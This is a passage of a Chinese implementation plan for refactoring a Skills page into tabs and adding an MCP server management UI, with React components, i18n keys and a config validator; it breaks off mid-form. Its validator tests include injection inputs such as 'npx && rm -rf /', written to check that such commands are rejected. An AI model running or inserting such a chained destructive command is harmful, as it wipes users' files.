- 导出从 `export function SkillsPage` 改为 `export function SkillsTab`
- import 路径深度 +1（因为多了一层 tabs/ 目录）：
  - `'@shared/types'` 不变（是 alias）
  - `'../../components/ConfirmDialog'` → `'../../../components/ConfirmDialog'`
  - `'../../i18n'` → `'../../../i18n'`
  - `'../../lib/ipc-client'` → `'../../../lib/ipc-client'`
  - `'../../stores/toastStore'` → `'../../../stores/toastStore'`

其余逻辑（useState、handle 函数、JSX）**完全不变**。

完整文件开头应类似：

```tsx
import type { Skill } from '@shared/types'
import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { ConfirmDialog } from '../../../components/ConfirmDialog'
import { useT } from '../../../i18n'
import { getAPI } from '../../../lib/ipc-client'
import { toast } from '../../../stores/toastStore'

// P3 优化: 模块级常量,避免每次渲染分配新对象
const SR_ONLY_STYLE: React.CSSProperties = {
  position: 'absolute',
  width: 1,
  height: 1,
  padding: 0,
  margin: -1,
  overflow: 'hidden',
  clip: 'rect(0,0,0,0)',
  whiteSpace: 'nowrap',
  border: 0,
}
const EMPTY_MENU_JSON = '[]'

export function SkillsTab() {
  // ... 以下与原 SkillsPage 完全一致 ...
}
```

- [ ] **Step 2: 重写 SkillsPage.tsx 为 Tab 容器**

把 `src/renderer/pages/Skills/SkillsPage.tsx` **整体替换**为：

```tsx
import { useLocalStorage } from '../../hooks'
import { useT } from '../../i18n'
import { McpTab } from './tabs/McpTab'
import { PluginsTab } from './tabs/PluginsTab'
import { SkillsTab } from './tabs/SkillsTab'

type TabKey = 'skills' | 'mcp' | 'plugins'

export function SkillsPage() {
  const { t } = useT()
  const [tab, setTab] = useLocalStorage<TabKey>('skills.activeTab', 'skills')

  const tabs: Array<{ key: TabKey; label: string }> = [
    { key: 'skills', label: t('page.skills.tab.skills') },
    { key: 'mcp', label: t('page.skills.tab.mcp') },
    { key: 'plugins', label: t('page.skills.tab.plugins') },
  ]

  return (
    <section className="h-full flex flex-col" aria-label={t('page.skills.title')}>
      {/* Tab 栏 */}
      <div className="flex border-b border-gray-200 dark:border-gray-700 flex-shrink-0">
        {tabs.map((tb) => (
          <button
            type="button"
            key={tb.key}
            onClick={() => setTab(tb.key)}
            className={`px-4 py-2 text-sm transition-colors
              ${
                tab === tb.key
                  ? 'text-blue-500 dark:text-blue-400 border-b-2 border-blue-500 dark:border-blue-400'
                  : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'
              }`}
          >
            {tb.label}
          </button>
        ))}
      </div>

      {/* Tab 内容 */}
      <div className="flex-1 overflow-hidden">
        {tab === 'skills' && <SkillsTab />}
        {tab === 'mcp' && <McpTab />}
        {tab === 'plugins' && <PluginsTab />}
      </div>
    </section>
  )
}
```

> 注意：这里 import 了 `McpTab` 和 `PluginsTab`，它们在 Task 7/8 创建。为了让这个 commit 能编译通过，**本步骤先创建占位文件**（见 Step 3），Task 7/8 再填充真实内容。

- [ ] **Step 3: 创建 McpTab 和 PluginsTab 占位（让编译通过）**

新建 `src/renderer/pages/Skills/tabs/McpTab.tsx`（临时占位）：

```tsx
export function McpTab() {
  return <div className="p-4 text-gray-500">MCP Tab (待实现)</div>
}
```

新建 `src/renderer/pages/Skills/tabs/PluginsTab.tsx`：

```tsx
import { EmptyState } from '../../../components/EmptyState'
import { useT } from '../../../i18n'

export function PluginsTab() {
  const { t } = useT()
  return (
    <EmptyState
      icon="🧩"
      title={t('page.skills.plugins.placeholder')}
    />
  )
}
```

- [ ] **Step 4: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误

- [ ] **Step 5: 手动启动 dev 验证页面能打开**

Run: `npm run dev:renderer`（在另一个终端）
然后 Tauri dev 模式打开应用，点导航栏「技能」：
Expected: 看到三个 Tab（技能 / MCP服务器 / 插件），点「技能」能看到原来的技能列表

- [ ] **Step 6: Commit**

```bash
git add src/renderer/pages/Skills/SkillsPage.tsx src/renderer/pages/Skills/tabs/
git commit -m "refactor(skills): SkillsPage 拆成 Tab 容器 + SkillsTab/McpTab/PluginsTab"
```

---

## Task 7: i18n 新增 key

**Files:**
- Modify: `src/renderer/i18n/zh.json`
- Modify: `src/renderer/i18n/en.json`

> 这一 task 必须在 Task 8（McpTab 实现）之前完成，因为 McpTab 会引用这些 key。

- [ ] **Step 1: zh.json 加 key**

打开 `src/renderer/i18n/zh.json`，找到 `"page.skills.title": "技能列表"`（约 L120）那一块，在其后追加（保持 JSON 合法，注意逗号）：

```json
  "page.skills.tab.skills": "技能",
  "page.skills.tab.mcp": "MCP 服务器",
  "page.skills.tab.plugins": "插件",
  "page.skills.plugins.placeholder": "插件功能即将推出",
  "page.mcp.title": "MCP 服务器",
  "page.mcp.empty.title": "尚未配置 MCP 服务器",
  "page.mcp.empty.hint": "MCP 服务器让 Agent 获得额外工具能力(如文件访问、网络搜索)",
  "page.mcp.add": "添加服务器",
  "page.mcp.addFromTemplate": "从模板添加",
  "page.mcp.edit": "编辑",
  "page.mcp.delete": "删除",
  "page.mcp.restoreDefault": "恢复默认",
  "page.mcp.test": "测试连接",
  "page.mcp.connect": "连接",
  "page.mcp.disconnect": "断开",
  "page.mcp.tools": "工具",
  "page.mcp.status.connected": "已连接",
  "page.mcp.status.disconnected": "未连接",
  "page.mcp.status.connecting": "连接中",
  "page.mcp.status.error": "错误",
  "page.mcp.source.global": "内置",
  "page.mcp.source.user": "自定义",
  "page.mcp.field.id": "ID",
  "page.mcp.field.name": "名称",
  "page.mcp.field.description": "描述",
  "page.mcp.field.transport": "传输方式",
  "page.mcp.field.command": "命令",
  "page.mcp.field.args": "参数",
  "page.mcp.field.env": "环境变量",
  "page.mcp.field.url": "URL",
  "page.mcp.field.headers": "请求头",
  "page.mcp.field.enabled": "启用",
  "page.mcp.transport.stdio": "stdio (本地进程)",
  "page.mcp.transport.sse": "SSE (HTTP)",
  "page.mcp.transport.websocket": "WebSocket",
  "page.mcp.preset.title": "选择预设模板",
  "page.mcp.preset.filesystem": "本地文件系统",
  "page.mcp.preset.websearch": "网页搜索",
  "page.mcp.preset.sqlite": "SQLite 数据库",
  "page.mcp.confirm.delete": "确定删除服务器「{name}」吗?",
  "toast.mcp.added": "服务器已添加",
  "toast.mcp.updated": "服务器已更新",
  "toast.mcp.removed": "服务器已删除",
  "toast.mcp.restored": "已恢复默认配置",
  "toast.mcp.testOk": "连接成功,{count} 个工具可用",
  "toast.mcp.testFail": "连接失败",
  "toast.mcp.connectSuccess": "已连接",
  "toast.mcp.connectFailed": "连接失败",
  "toast.mcp.loadFailed": "加载服务器列表失败",
```

- [ ] **Step 2: en.json 加对应英文 key**

打开 `src/renderer/i18n/en.json`，在相同位置追加英文翻译：

```json
  "page.skills.tab.skills": "Skills",
  "page.skills.tab.mcp": "MCP Servers",
  "page.skills.tab.plugins": "Plugins",
  "page.skills.plugins.placeholder": "Plugins coming soon",
  "page.mcp.title": "MCP Servers",
  "page.mcp.empty.title": "No MCP server configured",
  "page.mcp.empty.hint": "MCP servers give Agents extra tool capabilities (file access, web search, etc.)",
  "page.mcp.add": "Add Server",
  "page.mcp.addFromTemplate": "Add from Template",
  "page.mcp.edit": "Edit",
  "page.mcp.delete": "Delete",
  "page.mcp.restoreDefault": "Restore Default",
  "page.mcp.test": "Test Connection",
  "page.mcp.connect": "Connect",
  "page.mcp.disconnect": "Disconnect",
  "page.mcp.tools": "Tools",
  "page.mcp.status.connected": "Connected",
  "page.mcp.status.disconnected": "Disconnected",
  "page.mcp.status.connecting": "Connecting",
  "page.mcp.status.error": "Error",
  "page.mcp.source.global": "Built-in",
  "page.mcp.source.user": "Custom",
  "page.mcp.field.id": "ID",
  "page.mcp.field.name": "Name",
  "page.mcp.field.description": "Description",
  "page.mcp.field.transport": "Transport",
  "page.mcp.field.command": "Command",
  "page.mcp.field.args": "Arguments",
  "page.mcp.field.env": "Environment Variables",
  "page.mcp.field.url": "URL",
  "page.mcp.field.headers": "Headers",
  "page.mcp.field.enabled": "Enabled",
  "page.mcp.transport.stdio": "stdio (local process)",
  "page.mcp.transport.sse": "SSE (HTTP)",
  "page.mcp.transport.websocket": "WebSocket",
  "page.mcp.preset.title": "Choose a preset template",
  "page.mcp.preset.filesystem": "Local Filesystem",
  "page.mcp.preset.websearch": "Web Search",
  "page.mcp.preset.sqlite": "SQLite Database",
  "page.mcp.confirm.delete": "Delete server \"{name}\"?",
  "toast.mcp.added": "Server added",
  "toast.mcp.updated": "Server updated",
  "toast.mcp.removed": "Server removed",
  "toast.mcp.restored": "Restored default config",
  "toast.mcp.testOk": "Connected, {count} tools available",
  "toast.mcp.testFail": "Connection failed",
  "toast.mcp.connectSuccess": "Connected",
  "toast.mcp.connectFailed": "Connection failed",
  "toast.mcp.loadFailed": "Failed to load servers",
```

- [ ] **Step 3: 校验 JSON 合法性**

Run: `node -e "JSON.parse(require('fs').readFileSync('src/renderer/i18n/zh.json','utf-8')); JSON.parse(require('fs').readFileSync('src/renderer/i18n/en.json','utf-8')); console.log('JSON OK')"`
Expected: 输出 `JSON OK`

- [ ] **Step 4: Commit**

```bash
git add src/renderer/i18n/zh.json src/renderer/i18n/en.json
git commit -m "feat(i18n): 新增 MCP 管理 + 能力中心 Tab 相关 key (中英)"
```

---

## Task 8: McpTab 主组件 + 状态轮询

**Files:**
- Create: `src/renderer/pages/Skills/tabs/McpTab.tsx`（覆盖 Task 6 的占位）
- Create: `src/renderer/pages/Skills/components/McpServerCard.tsx`

- [ ] **Step 1: 创建 McpServerCard 组件**

新建 `src/renderer/pages/Skills/components/McpServerCard.tsx`：

```tsx
import type { McpServerStatus, McpTool } from '@shared/types'
import { useState } from 'react'
import { ConfirmDialog } from '../../../components/ConfirmDialog'
import { useT } from '../../../i18n'
import { cn } from '../../../lib/ui-utils'

interface McpServerCardProps {
  server: McpServerStatus
  tools: McpTool[]
  toolsLoading: boolean
  onTest: () => void
  onConnect: () => void
  onDisconnect: () => void
  onEdit: () => void
  onDelete: () => void
  onToggleEnabled: (enabled: boolean) => void
}

export function McpServerCard({
  server,
  tools,
  toolsLoading,
  onTest,
  onConnect,
  onDisconnect,
  onEdit,
  onDelete,
  onToggleEnabled,
}: McpServerCardProps) {
  const { t } = useT()
  const [showTools, setShowTools] = useState(false)
  const [confirmOpen, setConfirmOpen] = useState(false)

  const statusColor = server.connected
    ? 'bg-green-500'
    : server.lastError
      ? 'bg-red-500'
      : 'bg-gray-400'

  const statusText = server.connected
    ? t('page.mcp.status.connected')
    : server.lastError
      ? t('page.mcp.status.error')
      : t('page.mcp.status.disconnected')

  return (
    <div className="p-4 border border-gray-200 dark:border-gray-700 rounded-lg bg-white dark:bg-gray-800">
      {/* 头部:名称 + 来源 badge */}
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center gap-2">
          <span className={cn('inline-block w-2 h-2 rounded-full', statusColor)} />
          <h3 className="font-medium text-gray-900 dark:text-gray-100">{server.name}</h3>
          <span className="text-xs px-2 py-0.5 rounded bg-gray-100 dark:bg-gray-700 text-gray-600 dark:text-gray-400">
            {server.source === 'global'
              ? t('page.mcp.source.global')
              : t('page.mcp.source.user')}
          </span>
        </div>
        <label className="flex items-center gap-1 text-xs text-gray-600 dark:text-gray-400 cursor-pointer">
          <input
            type="checkbox"
            checked={server.enabled}
            onChange={(e) => onToggleEnabled(e.target.checked)}
            className="rounded"
          />
          {t('page.mcp.field.enabled')}
        </label>
      </div>

      {/* 元信息 */}
      <dl className="text-sm space-y-1 text-gray-600 dark:text-gray-400 mb-3">
        <div>
          <dt className="inline font-medium">id:</dt>
          <dd className="inline ml-2 font-mono">{server.id}</dd>
        </div>
        <div>
          <dt className="inline font-medium">{t('page.mcp.field.transport')}:</dt>
          <dd className="inline ml-2">{server.transport}</dd>
        </div>
        <div>
          <dt className="inline font-medium">{t('page.mcp.status.disconnected').split(' ')[0]}:</dt>
          <dd className="inline ml-2">{statusText}</dd>
          {server.lastError && (
            <span className="block ml-2 text-red-500 text-xs mt-1">{server.lastError}</span>
          )}
        </div>
      </dl>

      {/* 工具列表(可折叠) */}
      {server.connected && (
        <div className="mb-3">
          <button
            type="button"
            onClick={() => setShowTools(!showTools)}
            className="text-xs text-blue-500 hover:text-blue-600"
          >
            {showTools ? '▼' : '▶'} {t('page.mcp.tools')} ({toolsLoading ? '...' : tools.length})
          </button>
          {showTools && (
            <ul className="mt-2 ml-4 text-xs space-y-1 text-gray-600 dark:text-gray-400">
              {tools.map((tool) => (
                <li key={tool.name} className="font-mono">
                  <span className="text-blue-500">{tool.name}</span>
                  {tool.description && (
                    <span className="text-gray-400 ml-2">— {tool.description}</span>
                  )}
                </li>
              ))}
              {tools.length === 0 && !toolsLoading && (
                <li className="text-gray-400 italic">(no tools)</li>
              )}
            </ul>
          )}
        </div>
      )}

      {/* 操作按钮 */}
      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          onClick={onTest}
          className="px-3 py-1 text-xs rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
        >
          {t('page.mcp.test')}
        </button>
        {server.connected ? (
          <button
            type="button"
            onClick={onDisconnect}
            className="px-3 py-1 text-xs rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
          >
            {t('page.mcp.disconnect')}
          </button>
        ) : (
          <button
            type="button"
            onClick={onConnect}
            className="px-3 py-1 text-xs rounded border border-blue-500 text-blue-500 hover:bg-blue-50 dark:hover:bg-blue-900/20"
          >
            {t('page.mcp.connect')}
          </button>
        )}
        <button
          type="button"
          onClick={onEdit}
          className="px-3 py-1 text-xs rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
        >
          {t('page.mcp.edit')}
        </button>
        {server.source === 'user' && (
          <button
            type="button"
            onClick={() => setConfirmOpen(true)}
            className="px-3 py-1 text-xs rounded border border-red-400 text-red-500 hover:bg-red-50 dark:hover:bg-red-900/20"
          >
            {t('page.mcp.delete')}
          </button>
        )}
      </div>

      <ConfirmDialog
        open={confirmOpen}
        message={t('page.mcp.confirm.delete').replace('{name}', server.name)}
        variant="danger"
        onConfirm={() => {
          setConfirmOpen(false)
          onDelete()
        }}
        onCancel={() => setConfirmOpen(false)}
      />
    </div>
  )
}
```

- [ ] **Step 2: 创建 McpTab 主组件（覆盖占位）**

把 `src/renderer/pages/Skills/tabs/McpTab.tsx` 整体替换为：

```tsx
import type { McpServerConfig, McpServerStatus, McpTool } from '@shared/types'
import { useCallback, useEffect, useState } from 'react'
import { EmptyState } from '../../../components/EmptyState'
import { useInterval } from '../../../hooks'
import { useT } from '../../../i18n'
import { getAPI } from '../../../lib/ipc-client'
import { toast } from '../../../stores/toastStore'
import { McpServerCard } from '../components/McpServerCard'
import { McpServerForm } from '../components/McpServerForm'
import { PresetTemplates } from '../components/PresetTemplates'

export function McpTab() {
  const { t } = useT()
  const [servers, setServers] = useState<McpServerStatus[]>([])
  const [loading, setLoading] = useState(true)
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [toolsCache, setToolsCache] = useState<Record<string, McpTool[]>>({})
  const [toolsLoadingId, setToolsLoadingId] = useState<string | null>(null)
  const [showForm, setShowForm] = useState(false)
  const [editingServer, setEditingServer] = useState<McpServerConfig | null>(null)
  const [showPresets, setShowPresets] = useState(false)
  const [presetDraft, setPresetDraft] = useState<McpServerConfig | null>(null)

  const loadServers = useCallback(async () => {
    try {
      const result = await getAPI().mcp.list()
      if (result.success) {
        setServers(result.servers)
      } else if (result.error) {
        toast.error(result.error)
      }
    } catch (err) {
      console.error('[MCP] load failed:', err)
      toast.error(t('toast.mcp.loadFailed'))
    } finally {
      setLoading(false)
    }
  }, [t])

  useEffect(() => {
    loadServers()
  }, [loadServers])

  // 每 5s 轮询刷新连接状态(粗轮询,工具列表懒加载)
  useInterval(loadServers, 5000)

  const selected = servers.find((s) => s.id === selectedId) ?? null

  // 拉取某 server 的工具列表(选中且已连接时)
  const loadTools = useCallback(
    async (serverId: string) => {
      setToolsLoadingId(serverId)
      try {
        const result = await getAPI().mcp.listTools(serverId)
        if (result.success) {
          setToolsCache((prev) => ({ ...prev, [serverId]: result.tools }))
        }
      } catch (err) {
        console.error('[MCP] listTools failed:', err)
      } finally {
        setToolsLoadingId(null)
      }
    },
    [],
  )

  useEffect(() => {
    if (selected?.connected && selectedId && !toolsCache[selectedId]) {
      loadTools(selectedId)
    }
  }, [selected, selectedId, toolsCache, loadTools])

  const handleTest = async (id: string) => {
    try {
      const result = await getAPI().mcp.test(id)
      if (result.success) {
        toast.success(t('toast.mcp.testOk').replace('{count}', String(result.toolCount)))
        await loadServers()
        await loadTools(id)
      } else {
        toast.error(result.error || t('toast.mcp.testFail'))
      }
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  const handleConnect = async (id: string) => {
    try {
      const result = await getAPI().mcp.connect(id)
      if (result.success) {
        toast.success(t('toast.mcp.connectSuccess'))
        await loadServers()
        await loadTools(id)
      } else {
        toast.error(result.error || t('toast.mcp.connectFailed'))
      }
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  const handleDisconnect = async (id: string) => {
    try {
      await getAPI().mcp.disconnect(id)
      setToolsCache((prev) => {
        const next = { ...prev }
        delete next[id]
        return next
      })
      await loadServers()
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  const handleToggleEnabled = async (id: string, enabled: boolean) => {
    try {
      const result = await getAPI().mcp.update(id, { enabled })
      if (result.success) {
        toast.success(t('toast.mcp.updated'))
        await loadServers()
      } else {
        toast.error(result.error || t('toast.mcp.updated'))
      }
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const result = await getAPI().mcp.remove(id)
      if (result.success) {
        toast.success(t('toast.mcp.removed'))
        if (selectedId === id) setSelectedId(null)
        await loadServers()
      } else {
        toast.error(result.error || t('toast.mcp.removed'))
      }
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  const handleEdit = async (id: string) => {
    // 从 listServers 拿不到完整 config(command/args/env 等),需要从 server 状态推断
    // 这里用一个简化的 fetch:由于 list 不返回完整 config,我们存一个最小 stub
    // 真实编辑需要后端加 mcp:get-config,但本次 YAGNI,编辑表单用已知字段预填,未知字段留空
    const s = servers.find((x) => x.id === id)
    if (!s) return
    setEditingServer({
      id: s.id,
      name: s.name,
      enabled: s.enabled,
      transport: s.transport,
    })
    setShowForm(true)
  }

  const handleFormSubmit = async (config: McpServerConfig) => {
    try {
      const isEdit = editingServer !== null
      const result = isEdit
        ? await getAPI().mcp.update(editingServer!.id, config)
        : await getAPI().mcp.add(config)
      if (result.success) {
        toast.success(isEdit ? t('toast.mcp.updated') : t('toast.mcp.added'))
        setShowForm(false)
        setEditingServer(null)
        setPresetDraft(null)
        await loadServers()
      } else {
        toast.error(result.error || 'Failed')
      }
    } catch (err) {
      toast.error((err as Error).message)
    }
  }

  if (loading) {
    return <div className="p-4 text-gray-500">Loading...</div>
  }

  return (
    <section className="h-full flex">
      {/* 左侧服务器列表 */}
      <div className="w-72 flex-shrink-0 border-r border-gray-200 dark:border-gray-700 flex flex-col bg-gray-50/30 dark:bg-gray-800/30">
        <div className="p-3 border-b border-gray-200 dark:border-gray-700 space-y-2">
          <button
            type="button"
            onClick={() => {
              setEditingServer(null)
              setShowForm(true)
            }}
            className="w-full px-3 py-1.5 text-sm rounded bg-blue-500 text-white hover:bg-blue-600"
          >
            + {t('page.mcp.add')}
          </button>
          <button
            type="button"
            onClick={() => setShowPresets(true)}
            className="w-full px-3 py-1.5 text-sm rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
          >
            ⚡ {t('page.mcp.addFromTemplate')}
          </button>
        </div>
        <div className="flex-1 overflow-auto">
          {servers.length === 0 ? (
            <div className="p-4">
              <EmptyState
                icon="🔌"
                title={t('page.mcp.empty.title')}
                description={t('page.mcp.empty.hint')}
              />
            </div>
          ) : (
            <ul>
              {servers.map((s) => (
                <li key={s.id}>
                  <button
                    type="button"
                    onClick={() => setSelectedId(s.id)}
                    className={`w-full text-left px-3 py-2 text-sm border-b border-gray-100 dark:border-gray-700/50 hover:bg-gray-100 dark:hover:bg-gray-700/50 ${
                      selectedId === s.id ? 'bg-blue-50 dark:bg-blue-900/20' : ''
                    }`}
                  >
                    <div className="flex items-center gap-2">
                      <span
                        className={`inline-block w-1.5 h-1.5 rounded-full ${
                          s.connected ? 'bg-green-500' : 'bg-gray-400'
                        }`}
                      />
                      <span className="truncate font-medium text-gray-900 dark:text-gray-100">
                        {s.name}
                      </span>
                    </div>
                    <div className="ml-3.5 text-xs text-gray-500 dark:text-gray-400">
                      {s.transport} · {s.connected ? `${s.toolCount} ${t('page.mcp.tools')}` : t('page.mcp.status.disconnected')}
                    </div>
                  </button>
                </li>
              ))}
            </ul>
          )}
        </div>
      </div>

      {/* 右侧详情 */}
      <div className="flex-1 overflow-auto p-4">
        {selected ? (
          <McpServerCard
            server={selected}
            tools={toolsCache[selected.id] ?? []}
            toolsLoading={toolsLoadingId === selected.id}
            onTest={() => handleTest(selected.id)}
            onConnect={() => handleConnect(selected.id)}
            onDisconnect={() => handleDisconnect(selected.id)}
            onEdit={() => handleEdit(selected.id)}
            onDelete={() => handleDelete(selected.id)}
            onToggleEnabled={(enabled) => handleToggleEnabled(selected.id, enabled)}
          />
        ) : (
          <EmptyState
            icon="🔌"
            title={t('page.mcp.empty.title')}
            description={t('page.mcp.empty.hint')}
          />
        )}
      </div>

      {/* 新增/编辑表单弹窗 */}
      {showForm && (
        <McpServerForm
          initial={editingServer ?? presetDraft}
          onSubmit={handleFormSubmit}
          onCancel={() => {
            setShowForm(false)
            setEditingServer(null)
            setPresetDraft(null)
          }}
        />
      )}

      {/* 预设模板弹窗 */}
      {showPresets && (
        <PresetTemplates
          onSelect={(config) => {
            setShowPresets(false)
            setEditingServer(null)
            // 把模板填入表单,让用户再确认
            setPresetDraft(config)
            setShowForm(true)
          }}
          onCancel={() => setShowPresets(false)}
        />
      )}
    </section>
  )
}
```

> **依赖说明**：本 Task 的 McpTab import 了 `McpServerForm`（Task 9）和 `PresetTemplates`（Task 10）。**执行顺序上 Task 9、10 必须先于 Task 8 完成**，否则编译失败。三个文件一起在 Task 10 末尾 commit。

- [ ] **Step 3: 类型检查**

Run: `npx tsc --noEmit`
Expected: 报错指向 `McpServerForm` 和 `PresetTemplates` 不存在（Task 9、10 创建）。这是预期的，这两个组件在后续 task 创建。

> **本 task 到此为止，不 commit**。Task 9、10 创建完依赖组件后，三个文件一起 commit。

---

## Task 9: McpServerForm 表单组件 + 校验

**Files:**
- Create: `src/renderer/pages/Skills/components/McpServerForm.tsx`
- Create: `src/renderer/pages/Skills/mcp-validate.ts`
- Test: `tests/renderer/lib/mcp-validate.test.ts`

- [ ] **Step 1: 写校验纯函数测试**

新建 `tests/renderer/lib/mcp-validate.test.ts`：

```ts
import { describe, expect, it } from 'vitest'
import { validateMcpConfig } from '../../../src/renderer/pages/Skills/mcp-validate'

describe('validateMcpConfig', () => {
  it('合法 stdio 配置无错误', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
      args: ['-y', 'server'],
    })
    expect(errors).toEqual({})
  })

  it('合法 sse 配置无错误', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'sse',
      url: 'https://example.com/sse',
    })
    expect(errors).toEqual({})
  })

  it('id 为空报错', () => {
    const errors = validateMcpConfig({
      id: '',
      name: '测试',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    expect(errors.id).toBeTruthy()
  })

  it('id 含非法字符报错', () => {
    const errors = validateMcpConfig({
      id: 'test; rm',
      name: '测试',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    expect(errors.id).toBeTruthy()
  })

  it('name 为空报错', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
    })
    expect(errors.name).toBeTruthy()
  })

  it('stdio 缺 command 报错', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'stdio',
    })
    expect(errors.command).toBeTruthy()
  })

  it('sse 缺 url 报错', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'sse',
    })
    expect(errors.url).toBeTruthy()
  })

  it('url 格式非法报错', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'sse',
      url: 'not-a-url',
    })
    expect(errors.url).toBeTruthy()
  })

  it('command 含 shell 元字符报错', () => {
    const errors = validateMcpConfig({
      id: 'test',
      name: '测试',
      enabled: true,
      transport: 'stdio',
      command: 'npx && rm -rf /',
    })
    expect(errors.command).toBeTruthy()
  })
})
```

- [ ] **Step 2: 运行测试确认失败**

Run: `npx vitest run tests/renderer/lib/mcp-validate.test.ts`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 实现 mcp-validate.ts**

新建 `src/renderer/pages/Skills/mcp-validate.ts`：

```ts
import type { McpServerConfig } from '@shared/types'

export type McpConfigErrors = Partial<Record<keyof McpServerConfig | 'id', string>>

const ID_RE = /^[a-zA-Z0-9_-]+$/
const URL_RE = /^https?:\/\/.+/
const SHELL_META_RE = /[;&|`$<>]/

/**
 * 校验 MCP server 配置(前端表单用,纯函数)。
 * 返回 errors 对象,空对象 = 合法。
 * 与后端 validateServerConfig + validateCommandSafe 保持一致语义。
 */
export function validateMcpConfig(config: Partial<McpServerConfig>): McpConfigErrors {
  const errors: McpConfigErrors = {}

  if (!config.id || config.id.trim().length === 0) {
    errors.id = 'ID 不能为空'
  } else if (config.id.length > 128) {
    errors.id = 'ID 过长(最多 128 字符)'
  } else if (!ID_RE.test(config.id)) {
    errors.id = 'ID 只能包含字母、数字、下划线、连字符'
  }

  if (!config.name || config.name.trim().length === 0) {
    errors.name = '名称不能为空'
  }

  if (config.transport === 'stdio') {
    if (!config.command || config.command.trim().length === 0) {
      errors.command = 'stdio 传输必须填写命令'
    } else if (SHELL_META_RE.test(config.command)) {
      errors.command = '命令包含非法 shell 字符'
    }
  }

  if (config.transport === 'sse' || config.transport === 'websocket') {
    if (!config.url || config.url.trim().length === 0) {
      errors.url = '必须填写 URL'
    } else if (!URL_RE.test(config.url)) {
      errors.url = 'URL 格式不正确(需以 http:// 或 https:// 开头)'
    }
  }

  return errors
}
```

- [ ] **Step 4: 运行测试确认通过**

Run: `npx vitest run tests/renderer/lib/mcp-validate.test.ts`
Expected: PASS

- [ ] **Step 5: 实现 McpServerForm 组件**

新建 `src/renderer/pages/Skills/components/McpServerForm.tsx`：

```tsx
import type { McpServerConfig, McpTransport } from '@shared/types'
import { useState } from 'react'
import { useT } from '../../../i18n'
import { validateMcpConfig } from '../mcp-validate'

interface McpServerFormProps {
  initial: Partial<McpServerConfig> | null
  onSubmit: (config: McpServerConfig) => void
  onCancel: () => void
}

export function McpServerForm({ initial, onSubmit, onCancel }: McpServerFormProps) {
  const { t } = useT()
  const [draft, setDraft] = useState<Partial<McpServerConfig>>({
    id: '',
    name: '',
    description: '',
    enabled: true,
    transport: 'stdio',
    command: '',
    args: '',
    env: '',
    url: '',
    headers: '',
    ...initial,
  })
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [submitted, setSubmitted] = useState(false)

  const update = (patch: Partial<typeof draft>) => {
    setDraft((prev) => ({ ...prev, ...patch }))
    if (submitted) {
      setErrors(validateMcpConfig({ ...draft, ...patch }))
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitted(true)
    const errs = validateMcpConfig(draft)
    setErrors(errs)
    if (Object.keys(errs).length > 0) return

    // 把字符串形式的 args/env/headers 解析回数组/对象
    const config: McpServerConfig = {
      id: draft.id!.trim(),
      name: draft.name!.trim(),
      description: draft.description?.trim() || undefined,
      enabled: draft.enabled ?? true,
      transport: draft.transport as McpTransport,
      ...(draft.transport === 'stdio'
        ? {
            command: draft.command!.trim(),
            args: parseArgs(draft.args),
            env: parseKv(draft.env),
          }
        : {
            url: draft.url!.trim(),
            headers: parseKv(draft.headers),
          }),
    }
    onSubmit(config)
  }

  return (
    <div
      className="fixed inset-0 bg-black/40 flex items-center justify-center z-50"
      onClick={onCancel}
    >
      <form
        onSubmit={handleSubmit}
        onClick={(e) => e.stopPropagation()}
        className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-lg max-h-[90vh] overflow-auto"
      >
        <h2 className="text-lg font-medium mb-4 text-gray-900 dark:text-gray-100">
          {initial ? t('page.mcp.edit') : t('page.mcp.add')}
        </h2>

        <div className="space-y-3">
          <FormField label={t('page.mcp.field.id')} error={errors.id} required>
            <input
              type="text"
              value={draft.id}
              onChange={(e) => update({ id: e.target.value })}
              disabled={!!initial}
              className="w-full px-2 py-1 border rounded dark:bg-gray-700 dark:border-gray-600 disabled:opacity-50"
            />
          </FormField>

          <FormField label={t('page.mcp.field.name')} error={errors.name} required>
            <input
              type="text"
              value={draft.name}
              onChange={(e) => update({ name: e.target.value })}
              className="w-full px-2 py-1 border rounded dark:bg-gray-700 dark:border-gray-600"
            />
          </FormField>

          <FormField label={t('page.mcp.field.description')}>
            <input
              type="text"
              value={draft.description}
              onChange={(e) => update({ description: e.target.value })}
              className="w-full px-2 py-1 border rounded dark:bg-gray-700 dark:border-gray-600"
            />
          </FormField>

          <FormField label={t('page.mcp.field.transport')} required>
            <select
              value={draft.transport}
              onChange={(e) => update({ transport: e.target.value as McpTransport })}
              className="w-full px-2 py-1 border rounded dark:bg-gray-700 dark:border-gray-600"
            >
              <option value="stdio">{t('page.mcp.transport.stdio')}</option>
              <option value="sse">{t('page.mcp.transport.sse')}</option>
